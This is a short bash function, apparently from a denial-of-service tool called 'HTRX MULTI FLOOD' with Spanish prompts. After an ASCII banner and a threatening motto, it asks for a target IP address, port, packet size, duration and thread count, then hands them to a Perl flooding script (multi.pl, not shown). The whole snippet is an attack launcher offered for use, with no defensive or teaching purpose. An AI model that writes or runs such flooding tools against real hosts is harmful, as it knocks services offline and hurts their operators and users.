multi()
{
    clear
    echo -e " $CYAN} "
    echo "               HTRX MULTI FLOOD UPDATED "   
    echo "Script"
    echo ""	
    echo -e "        '||    ||'          '||    .    || " 
    echo -e "         |||  |||  ... ...   ||  .||.  ...  "
    echo -e "         |'|..'||   ||  ||   ||   ||    ||  "
    echo -e "         | '|' ||   ||  ||   ||   ||    ||  "
    echo -e "        .|. | .||.  '|..'|. .||.  '|.' .||. "
    echo ""
    echo "    El que se atreva a jugar a dios debe pagar un alto precio.."
    echo ""
echo "IP Address :"
read ip
echo "Puerto :"
read port
echo "Enter size Ex: 65500"
read size
echo "Segundos :"
read time
echo "Ingrese el número de hilos :"
read threads
echo "¿Le gustaria ver la salida ADVERTENCIA si sí la inundacion puede disminuir? 0 = No 1 = Si"
read output
perl multi.pl $ip $port $size $time $threads $output
}

